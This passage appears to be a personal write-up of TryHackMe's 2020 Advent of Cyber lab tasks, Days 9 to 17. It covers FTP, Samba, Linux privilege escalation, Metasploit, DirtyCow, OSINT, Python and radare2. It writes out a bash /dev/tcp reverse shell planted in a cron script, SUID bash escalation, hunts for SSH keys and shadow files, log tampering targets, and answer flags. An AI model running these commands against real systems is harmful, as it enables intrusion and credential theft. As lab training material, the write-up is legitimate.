+    <p>Enter FTP’s <strong>“Anonymous” mode</strong>…This setting allows a default username to be used with any password by a client.</p>
+
+    <ul>
+      <li>This user is treated like any other user on the FTP server - including enforcing permissions and privileges to commands and data.</li>
+    </ul>
+  </li>
+  <li>
+    <p>using the FTP server: <code class="language-plaintext highlighter-rouge">ftp &lt;ip_address&gt;</code></p>
+
+    <ul>
+      <li>as a username, we type: <code class="language-plaintext highlighter-rouge">anonymous</code></li>
+    </ul>
+  </li>
+  <li>
+    <p>list of commands: <code class="language-plaintext highlighter-rouge">help</code></p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">ls</code> - list files and directories in the working directory on the FTP server</li>
+      <li><code class="language-plaintext highlighter-rouge">cd</code> - change our working directory on the FTP server</li>
+      <li><code class="language-plaintext highlighter-rouge">get</code> - download a file from the FTP server to our device</li>
+      <li><code class="language-plaintext highlighter-rouge">put</code> - upload a file from our device to the FTP server</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-2">Questions</h3>
+
+<ol>
+  <li>Name the directory on the FTP server that has data accessible by the “anonymous” user</li>
+</ol>
+
+<ul>
+  <li>connect to the ftp server in anonymous mode, run a ls command and then figure out the only directory I am allowed to go into</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/ftpin.png" alt="" /></p>
+
+<p>A: public</p>
+
+<ol>
+  <li>What script gets executed within this directory?</li>
+</ol>
+
+<ul>
+  <li>another ls command in the public directory gets us the answer</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/backuppp.png" alt="" /></p>
+
+<p>A: backup.sh</p>
+
+<ol>
+  <li>What movie did Santa have on his Christmas shopping list?</li>
+</ol>
+
+<ul>
+  <li>I downloaded the file using <code class="language-plaintext highlighter-rouge">get</code> and cat it on my own machine to get the name of the movie</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/getshooping.png" alt="" /></p>
+
+<p>A: The Polar Express</p>
+
+<ol>
+  <li>Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Note that the script that we have uploaded may take a minute to return a connection. If it doesn’t after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.</p>
+  </li>
+  <li>
+    <p>downloaded the script using <code class="language-plaintext highlighter-rouge">get</code>, then using nano on my local machine I added the line <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/&lt;local_ip&gt;/&lt;local_port&gt; 0&gt;&amp;1</code>.</p>
+  </li>
+  <li>
+    <p>set up a nc listener <code class="language-plaintext highlighter-rouge">nc -lnvp &lt;local_port&gt;</code> and waited one minute to get a shell.</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/reversseee.png" alt="" /></p>
+
+<p>A: THM{even_you_can_be_santa}</p>
+
+<h2 id="day-10-networking-dont-be-selfish">[Day 10] <code class="language-plaintext highlighter-rouge">Networking</code> Don’t be sELFish</h2>
+
+<p>#samba</p>
+
+<ul>
+  <li>
+    <p>we’ll be covering an alternative technology for file-sharing that is most used within <em>organisation/company networks</em>. Offering encryption as standard, this technology consists of two protocols:</p>
+
+    <ul>
+      <li>
+        <p><strong>SMB (Server Message Block)</strong> - Natively supported by Windows and not Linux</p>
+      </li>
+      <li>
+        <p><strong>NFS (Network File System)</strong> - Natively supported by Linux and not Windows</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Protocols such as SMB send “requests” and “responses” when communicating with each other, as illustrated below:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/smb.jpg" alt="" /></p>
+
+<ul>
+  <li>
+    <p>What makes Samba so popular and useful is that it removes the differences between these two protocols, meaning that the two operating systems can now share resources including files amongst each other.</p>
+  </li>
+  <li>
+    <p>Simply, Samba connects to a <code class="language-plaintext highlighter-rouge">"share"</code> (think of this as a virtual folder) and is capable of day-to-day activities like deleting, moving or uploading files.</p>
+  </li>
+  <li>
+    <p>Samba is flexible in the sense it can be useful for both you and me or businesses with thousands of employees.</p>
+
+    <ul>
+      <li>For example, employees can access documents from a central computer rather than each employee storing their own copy.</li>
+    </ul>
+  </li>
+  <li>
+    <p>As previously mentioned, this technology is encrypted enabling sensitive data like username and passwords used in the authentication process (and the data itself)  to be communicated between client/server securely.</p>
+  </li>
+  <li>
+    <p>we are going to use <code class="language-plaintext highlighter-rouge">enum4linux</code></p>
+  </li>
+  <li>
+    <p>However, a very common and easy to cause vulnerability by administrators is wrong permissions. You may be able to access a share and its data without logging in at all</p>
+  </li>
+  <li>
+    <p>Unlike FTP, other IT devices such as network printers can also be shared between client/server.</p>
+  </li>
+  <li>
+    <p>begin accessing the Samba server and its shares:</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">smbclient //REPLACE_INSTANCE_IP_ADDRESS/**sharename**</code></li>
+    </ul>
+  </li>
+  <li>
+    <p>You will be asked for a password, the easiest password is no password! We can just press “Enter” to test this theory.</p>
+
+    <ul>
+      <li>If successful, this means that the share requires no authentication and we are now logged in.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/lololoo.png" alt="" /></p>
+
+<ul>
+  <li>Useful Samba commands:</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/sambaaacommd.png" alt="" /></p>
+
+<h3 id="questions-3">Questions</h3>
+
+<ol>
+  <li>Using enum4linux, how many users are there on the Samba server?</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">enum4linux -U -d -r &lt;ip&gt;</code></p>
+
+<ul>
+  <li>Users: elfmceager, elfmcelferson, elfmcskidy</li>
+</ul>
+
+<p>A: 3</p>
+
+<ol>
+  <li>Now how many “shares” are there on the Samba server?</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">enum4linux -S -r &lt;ip&gt;</code></p>
+
+<p><img src="/tryhackme/AdventCalendar2020/sambashares.png" alt="" /></p>
+
+<p>A: 4</p>
+
+<ol>
+  <li>Use smbclient to try to login to the shares on the Samba server. What share doesn’t require a password?</li>
+</ol>
+
+<ul>
+  <li>tried to log in on the santa share and it worked</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">smbclient //&lt;ip&gt;/tbfc-santa</code></p>
+
+<p><img src="/tryhackme/AdventCalendar2020/santtaa.png" alt="" /></p>
+
+<p>A: tbfc-santa</p>
+
+<ol>
+  <li>Log in to this share, what directory did ElfMcSkidy leave for Santa?</li>
+</ol>
+
+<ul>
+  <li>an ls command</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/jingle.png" alt="" /></p>
+
+<p>A: jingle-tunes</p>
+
+<h2 id="day-11-networking-the-rogue-gnome">[Day 11] <code class="language-plaintext highlighter-rouge">Networking</code> The Rogue Gnome</h2>
+
+<p>#privesc #suid</p>
+
+<ul>
+  <li>
+    <p>Generally speaking, only Administrators can modify system settings or change the permissions of other users resources like files and folders.</p>
+  </li>
+  <li>
+    <p>Users may be further divided into roles such as within a company.</p>
+
+    <ul>
+      <li>Staff in HR are only able to access HR documents whereas accounting staff are only able to access accounting resources.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Privilege escalation</strong> is simply the process of increasing the current privileges we have to permissions above us.</p>
+  </li>
+  <li>
+    <p>A <strong>horizontal privilege escalation</strong> attack involves using the intended permissions of a user to abuse a vulnerability to access another user’s resources who has similar permissions to you.</p>
+
+    <ul>
+      <li>
+        <p>For example, using an account with access to accounting documents to access a HR account to retrieve HR documents.</p>
+      </li>
+      <li>
+        <p>As the <em>difference</em> in the permissions of both the Accounting and HR accounts is the <em>data they can access</em>, you aren’t moving your privileges upwards.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>A bit more traditional, a <strong>vertical privilege escalation</strong> attack involves exploiting a vulnerability that allows you to perform actions like commands or accessing data acting as a higher privileged account such as an administrator.</p>
+  </li>
+  <li>
+    <p>A common issue you will face in offensive pentesting is <strong>instability</strong>.</p>
+
+    <ul>
+      <li>
+        <p>Take for example the Eternalblue exploit which conducts a series of vulnerabilities in how the Windows OS allocates and manages memory.</p>
+
+        <ul>
+          <li>As the exploit writes to memory in an in-proper way, there is a chance of the computer crashing.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Executing a rev. shell:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/reverseeee.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>Executing the <code class="language-plaintext highlighter-rouge">whoami</code> command allows us to see what the name of the account that we are executing commands as.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">echo $0</code> informs us of our shell - it is currently a <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+  </li>
+  <li>
+    <p>In shells like our current Netcat, we don’t have many luxuries such as <strong>tab-completion</strong> and <strong>re-selecting the last command executed</strong> (using the up-arrow), but importantly, we can’t use commands that ask for <em>additional input</em> i.e. <strong>providing SSH credentials</strong> or using the substitute user command <code class="language-plaintext highlighter-rouge">su</code></p>
+  </li>
+  <li>
+    <p>Modern Ubuntu installs come with python3 installed, we can spawn another shell and begin to make it interactive:</p>
+  </li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<ul>
+  <li>
+    <p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys">Ways how to make your shell interactive</a></p>
+  </li>
+  <li>
+    <p>After we have gained access, we can use the <code class="language-plaintext highlighter-rouge">find</code> command to search for:</p>
+
+    <ul>
+      <li>backups</li>
+      <li>passwords</li>
+      <li>admin</li>
+      <li>config</li>
+    </ul>
+  </li>
+  <li>
+    <p>finding a private SSH key (named <strong>id_rsa</strong>): <code class="language-plaintext highlighter-rouge">find / -name id_rsa 2&gt; /dev/null</code></p>
+  </li>
+  <li>
+    <p>As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement.</p>
+  </li>
+  <li>
+    <p>Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
+
+2. Locating other services running or applications installed that may be abusable (SUID &amp; out of date software)
+
+3. Looking for automated scripts like backup scripts (exploiting crontabs)
+
+4. Credentials (user accounts, application config files..)
+
+5. Mis-configured file and directory permissions
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Checklists for the enumeration stage of privilege escalation:</p>
+
+    <ul>
+      <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation">g0tmi1k</a></li>
+      <li><a href="https://payatu.com/guide-linux-privilege-escalation">payatu</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation">PayloadAllTheThings</a></li>
+    </ul>
+  </li>
+  <li>
+    <p>Normally, executables and commands (commands are just shortcuts to executables) will execute as the user who is running them (assuming they have the file permissions to do so.)</p>
+  </li>
+  <li>
+    <p>This is why some commands such as <em>changing a user’s password</em> require sudo in front of them.</p>
+
+    <ul>
+      <li>The sudo allows you to execute something with the permissions as root (the most privileged user).</li>
+    </ul>
+  </li>
+  <li>
+    <p>Users who can use sudo are called “<strong>sudoers</strong>” and are listed in <strong>/etc/sudoers</strong> (we can use this to help identify valuable users to us).</p>
+  </li>
+  <li>
+    <p><strong>SUID</strong> is simply a permission added to an executable that does a similar thing as sudo.</p>
+
+    <ul>
+      <li>However, instead, allows users to run the executable as whoever owns it</li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="https://gtfobins.github.io/">GTFOBins</a> lists the majority of applications that are capable of interacting with the operating system such as reading/writing files or creating shells.</p>
+  </li>
+  <li>
+    <p>search the machine for executables with the SUID permission set: <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+  </li>
+  <li>
+    <p>things we are searching for:</p>
+
+    <ul>
+      <li>
+        <p>contents of other user directories (i.e. <em>bash history</em>, <em>ssh keys</em>, <em>user.txt</em>)</p>
+      </li>
+      <li>
+        <p>contents of the “/root” directory (i.e. “/root/flag.txt”)</p>
+      </li>
+      <li>
+        <p>”<code class="language-plaintext highlighter-rouge">/etc/passwd</code>” &amp; “<code class="language-plaintext highlighter-rouge">/etc/shadow</code>” files for password cracking</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>enumeration scripts available to use that automate some of the enumeration processes for us: <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum</a></p>
+
+    <ul>
+      <li>LinEnum enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!</li>
+    </ul>
+  </li>
+  <li>
+    <p>Transfering a file through <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/netcattransferfile.png" alt="" /></p>
+
+<blockquote>
+  <p>How to cover our tracks?</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Some log files of interest:</p>
+
+    <ul>
+      <li>
+        <p><strong>/var/log/auth.log</strong> (Attempted logins for SSH, changes too or logging in as system users)</p>
+      </li>
+      <li>
+        <p><strong>/var/log/syslog</strong> (System events such as firewall alerts)</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">"/var/log/&lt;service&gt;</code></p>
+        <ul>
+          <li>Logs of apache2: <code class="language-plaintext highlighter-rouge">/var/log/apache2/access/log</code></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-4">Questions</h3>
+
+<ol>
+  <li>What type of privilege escalation involves using a user account to execute commands as an administrator?</li>
+</ol>
+
+<p>A: vertical</p>
+
+<ol>
+  <li>What is the name of the file that contains a list of users who are a part of the sudo group?</li>
+</ol>
+
+<p>A: sudoers</p>
+
+<p>Use SSH to log in to the vulnerable machine like so: ssh cmnatic@MACHINE_IP</p>
+
+<p>Input the following password when prompted: aoc2020</p>
+
+<p>Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.</p>
+
+<p>You may find uploading some of the enumeration scripts that were used during today’s task to be useful.</p>
+
+<p>Use this executable to launch a system shell as root.</p>
+
+<ol>
+  <li>What are the contents of the file located at /root/flag.txt?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>used the command <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type file 2&gt;/dev/null</code> to get the binaries with the SUID bit set.</p>
+  </li>
+  <li>
+    <p>found that <em>bash</em> is one of them</p>
+  </li>
+  <li>
+    <p>ran <code class="language-plaintext highlighter-rouge">/bin/bash -p</code> to priv esc.</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/privescroot.png" alt="" /></p>
+
+<p>A: thm{2fb10afe933296592}</p>
+
+<h2 id="day-12-networking-ready-set-elf">[Day 12] <code class="language-plaintext highlighter-rouge">Networking</code> Ready, set, elf</h2>
+
+<ul>
+  <li>Known as information disclosure, these nuggets of information are handed to us by the server through error messages such as in the following screenshot, HTTP headers or even on the website itself.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/apachee.png" alt="" /></p>
+
+<ul>
+  <li>An attacker can use knowledgebases such as <a href="http://rapid7.com/">Rapid7</a>, <a href="https://attackerkb.com/">AttackerKB</a>, <a href="https://cve.mitre.org/cve/">MITRE</a> or <a href="http://exploit-db.com/">Exploit-DB</a> to look for vulnerabilities associated with the version number of that application.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/cve.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p><strong>The Common Gateway Interface</strong> or <strong>CGI</strong> for short is a standard means of communicating and processing data between a client such as a web browser to a web server.</p>
+  </li>
+  <li>
+    <p>Simply, this technology facilitates interaction with programmes such as Python script files, C++ and Java application, or system commands all within the browser - as if you were executing it on the command line.</p>
+  </li>
+  <li>
+    <p>The commonplace for CGI scripts to be stored is within the /cgi-bin/ folder on a webserver.</p>
+  </li>
+  <li>
+    <p>Now we understand the application that’s running, tools such as Metasploit can be used to confirm suspicions and hopefully leverage them!</p>
+  </li>
+</ul>
+
+<h3 id="questions-5">Questions</h3>
+
+<ol>
+  <li>What is the version number of the web server?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/nmapscaaaan.png" alt="" /></p>
+
+<p>A: 9.0.17</p>
+
+<ol>
+  <li>What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/apachecve.png" alt="" /></p>
+
+<p>A: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0232">CVE-2019-0232</a></p>
+
+<p>Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.</p>
+
+<ol>
+  <li>What are the contents of flag1.txt</li>
+</ol>
+
+<ul>
+  <li>
+    <p>ran <code class="language-plaintext highlighter-rouge">msfconsole</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">search Apache cgi</code></p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/msfexploit.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>set the RHOSTS as the ip address of the vuln machine URI to /cgi-bin/elfwhacker.bat</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">run</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">shell</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">type flag1.txt</code></p>
+  </li>
+</ul>
+
+<p>A: thm{whacking_all_the_elves}</p>
+
+<p>Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!</p>
+
+<h2 id="day-13-special-by-john-hammond-coal-for-christmas">[Day 13] <code class="language-plaintext highlighter-rouge">Special by John Hammond</code> Coal for Christmas</h2>
+
+<h3 id="questions-6">Questions</h3>
+
+<ol>
+  <li>What old, deprecated protocol and service is running?</li>
+</ol>
+
+<ul>
+  <li>did a stealth scan because the usual one takes some time to run</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/nmaaaap.png" alt="" /></p>
+
+<p>A: telnet</p>
+
+<ol>
+  <li>What credential was left for you?</li>
+</ol>
+
+<ul>
+  <li>connected using telnet and got some credentials which I used to log in and get a shell</li>
+</ul>
+
+<p>A: clauschristmas</p>
+
+<ol>
+  <li>What distribution of Linux and version number is this server running?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Often to enumerate you want to look at pertinent system information, like the version of the operating system or other release information.</p>
+  </li>
+  <li>
+    <p>You can view some information with commands like this:</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cat /etc/*release</code></li>
+      <li><code class="language-plaintext highlighter-rouge">uname -a</code></li>
+      <li><code class="language-plaintext highlighter-rouge">cat /etc/issue</code></li>
+    </ul>
+  </li>
+  <li>
+    <p><img src="/tryhackme/AdventCalendar2020/linuxinfo.png" alt="" /></p>
+  </li>
+</ul>
+
+<p>A: ubuntu 12.04</p>
+
+<ol>
+  <li>Who got here first?</li>
+</ol>
+
+<ul>
+  <li><img src="/tryhackme/AdventCalendar2020/cookiesss.png" alt="" /></li>
+</ul>
+
+<p>A: Grinch</p>
+
+<ol>
+  <li>What is the verbatim syntax you can use to compile, taken from the real C source code comments?</li>
+</ol>
+
+<ul>
+  <li>About <a href="https://dirtycow.ninja/">DirtyCow</a></li>
+</ul>
+
+<p>A: gcc -pthread dirty.c -o dirty -lcrypt</p>
+
+<ol>
+  <li>What “new” username was created, with the default operations of the real C source code?</li>
+</ol>
+
+<p>A: firefart</p>
+
+<ol>
+  <li>What is the MD5 hash output?</li>
+</ol>
+
+<ul>
+  <li>downlaoded the otiginal DirtyC0w from exploitDB, used a python http server to get it on the machine, compiled and ran it. Switched to the newly created user, go to the root directory and then follow Grinch’s instructions.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/endgame.png" alt="" /></p>
+
+<p>A: 8b16f00dd3b51efadb02c1df7f8427cc</p>
+
+<h2 id="day-14-special-by-thecybermentor-wheres-rudolph">[Day 14] <code class="language-plaintext highlighter-rouge">Special by TheCyberMentor</code> Where’s Rudolph?</h2>
+
+<p>#osint</p>
+
+<ul>
+  <li>
+    <p>tools:</p>
+
+    <ul>
+      <li>
+        <p>https://namechk.com/
+  , https://whatsmyname.app/ and https://namecheckup.com/ will identify other possible accounts quickly for us.</p>
+      </li>
+      <li>
+        <p>Tools, such as https://github.com/WebBreacher/WhatsMyName and https://github.com/sherlock-project/sherlock do this as well.</p>
+
+        <ul>
+          <li>Simply enter a username, hit search, and comb through the results. It’s that easy!</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>reverse image searching:</p>
+
+    <ul>
+      <li>https://yandex.com/images/</li>
+      <li>https://tineye.com/</li>
+      <li>https://www.bing.com/visualsearch?FORM=ILPVIS</li>
+    </ul>
+  </li>
+  <li>
+    <p>Provides password information:</p>
+
+    <ul>
+      <li>http://scylla.so/		-&gt; free and old data</li>
+      <li>https://dehashed.com/ -&gt; paid and up to date data</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-7">Questions</h3>
+
+<ol>
+  <li>What URL will take me directly to Rudolph’s Reddit comment history?</li>
+</ol>
+
+<p>A: https://www.reddit.com/user/IGuidetheClaus2020/comments/</p>
+
+<ol>
+  <li>According to Rudolph, where was he born?</li>
+</ol>
+
+<p>A: Chicago</p>
+
+<ol>
+  <li>Rudolph mentions Robert.  Can you use Google to tell me Robert’s last name?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/rudolphcreat.png" alt="" /></p>
+
+<p>A: May</p>
+
+<ol>
+  <li>On what other social media platform might Rudolph have an account?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/twitter.png" alt="" /></p>
+
+<p>A: Twitter</p>
+
+<p>5.What is Rudolph’s username on that platform?</p>
+
+<ul>
+  <li>searched on google: <code class="language-plaintext highlighter-rouge">IGuideTheClaus2020 site:twitter.com</code></li>
+</ul>
+
+<p>A: IGuideClaus2020</p>
+
+<ol>
+  <li>What appears to be Rudolph’s favorite TV show right now?</li>
+</ol>
+
+<ul>
+  <li>search its twitter</li>
+</ul>
+
+<p>A: Bachelorette</p>
+
+<ol>
+  <li>Based on Rudolph’s post history, he took part in a parade.  Where did the parade take place?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>on  twitter there are two pictures.</p>
+  </li>
+  <li>
+    <p>in the first one we can see <code class="language-plaintext highlighter-rouge">thompson coburn</code></p>
+  </li>
+  <li>
+    <p>googled it and found that it is in chicago</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/chigaco.png" alt="" /></p>
+
+<p>A: Chigago</p>
+
+<ol>
+  <li>Okay, you found the city, but where specifically was one of the photos taken?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>failed to get any info if I manually download the images.</p>
+  </li>
+  <li>
+    <p>after a while, I found a tweet with a link to a ‘higher resolution image’ -&gt; https://t.co/jmI66ZuNZI</p>
+  </li>
+  <li>
+    <p>I wget it and ran <code class="language-plaintext highlighter-rouge">exiftool</code> on it</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/exiftoool.png" alt="" /></p>
+
+<ul>
+  <li>to get the answer, you may want to upload the image to http://exif.regex.info/exif.cgi</li>
+</ul>
+
+<p>A: 41.891815, -87.624277</p>
+
+<ol>
+  <li>Did you find a flag too?</li>
+</ol>
+
+<p>A: {FLAG}ALWAYSCHECKTHEEXIFD4T4</p>
+
+<ol>
+  <li>Has Rudolph been pwned? What password of his appeared in a breach?</li>
+</ol>
+
+<ul>
+  <li>search on scylla with his email from twitter rudolphthered@hotmail.com</li>
+</ul>
+
+<p>A: spygame</p>
+
+<ol>
+  <li>Based on all the information gathered.  It’s likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?</li>
+</ol>
+
+<ul>
+  <li>we know from his tweets that he stays in Marriott hotel.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/rudolfhotel.png" alt="" /></p>
+
+<p>A: 540</p>
+
+<h2 id="day-15-scripting-theres-a-python-in-my-stocking">[Day 15] <code class="language-plaintext highlighter-rouge">Scripting</code> There’s a Python in my stocking!</h2>
+
+<p>#python</p>
+
+<ul>
+  <li><a href="https://polymath.cloud/python/">Python Zero to Hero</a></li>
+  <li><a href="https://realpython.com/python-modulo-operator/">Python Moduluo Operator in Practice</a></li>
+  <li><a href="https://automatetheboringstuff.com/">Automate the Boring Stuff with Python</a></li>
+</ul>
+
+<h3 id="questions-8">Questions</h3>
+
+<ol>
+  <li>What’s the output of True + True?</li>
+</ol>
+
+<p>A: 2</p>
+
+<ol>
+  <li>What’s the database for installing other peoples libraries called?</li>
+</ol>
+
+<p>A: PyPi</p>
+
+<ol>
+  <li>What is the output of bool(“False”)?</li>
+</ol>
+
+<p>A: True</p>
+
+<ol>
+  <li>What library lets us download the HTML of a webpage?</li>
+</ol>
+
+<p>A: Requests</p>
+
+<ol>
+  <li>What is the output of the program provided in “Code to analyse for Question 5” in today’s material?</li>
+</ol>
+
+<p>(This code is located above the Christmas banner and below the links in the main body of this task)</p>
+
+<p>A: [1,2,3,6]</p>
+
+<ol>
+  <li>What causes the previous task to output that?</li>
+</ol>
+
+<p>A: Pass by reference</p>
+
+<h2 id="day-16-scripting-help-where-is-santa">[Day 16] <code class="language-plaintext highlighter-rouge">Scripting</code> Help! Where is Santa?</h2>
+
+<p>#python</p>
+
+<h3 id="questions-9">Questions</h3>
+
+<ol>
+  <li>What is the port number for the web server?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/nmapscanlol.png" alt="" /></p>
+
+<p>A: 80</p>
+
+<ol>
+  <li>Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)</li>
+</ol>
+
+<ul>
+  <li>the link <code class="language-plaintext highlighter-rouge">Modulat modern free</code> contains the answer</li>
+</ul>
+
+<p>A: /api/</p>
+
+<ol>
+  <li>Where is Santa right now?</li>
+</ol>
+
+<ul>
+  <li>wrote a simple python script</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">2</span><span class="p">):</span>
+	<span class="n">site</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://10.10.24.177/api/"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+	<span class="k">if</span> <span class="s">"Error"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">site</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="n">site</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="p">(</span><span class="s">"Ended"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="/tryhackme/AdventCalendar2020/pythonresponse.png" alt="" /></p>
+
+<p>A: Winter Wonderland, Hyde Park, London.</p>
+
+<ol>
+  <li>Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa’s Sled will block you.</li>
+</ol>
+
+<p>A: 57</p>
+
+<h2 id="day-17-reverse-engineering-reverseelfneering">[Day 17] <code class="language-plaintext highlighter-rouge">Reverse Engineering</code> ReverseELFneering</h2>
+
+<p>#reverseengineering #reverse #radare2</p>
+
+<ul>
+  <li>
+    <p>before an executable file is produced, the source code is first compiled into assembly(<strong>.s</strong> files), after which the assembler converts it into an object program(<strong>.o</strong> files), and operations with a linker finally make it an executable.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">r2 -d ./file1</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">aa</code></p>
+
+    <ul>
+      <li>The analysis, in this case, involves extracting function names, flow control information, and much more! r2 instructions are usually based on a single character, so it is easy to get more information about the commands.</li>
+    </ul>
+  </li>
+  <li>
+    <p>list of the functions run: <code class="language-plaintext highlighter-rouge">afl</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">pdf @main</code>, where pdf means print disassembly function.</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/registeeeers.png" alt="" /></p>
+
+<ul>
+  <li>
+    <p>The general formula for working through something like this is:</p>
+
+    <ul>
+      <li>set appropriate breakpoints</li>
+      <li>use ds to move through instructions and check the values of register and memory</li>
+      <li>if you make a mistake, you can always reload the program using the <code class="language-plaintext highlighter-rouge">ood</code> command</li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="https://scoding.de/uploads/r2_cs.pdf">radare2 cheatsheet</a></p>
+  </li>
+</ul>
+
+<h3 id="questions-10">Questions</h3>
+
+<p><img src="/tryhackme/AdventCalendar2020/assem.png" alt="" /></p>
+
+<ol>
+  <li>What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?</li>
+</ol>
+
+<p>A: 1</p>
+
+<ol>
+  <li>What is the value of eax when the imull instruction is called?</li>
+</ol>
+
+<p>A: 6</p>
+
+<ol>
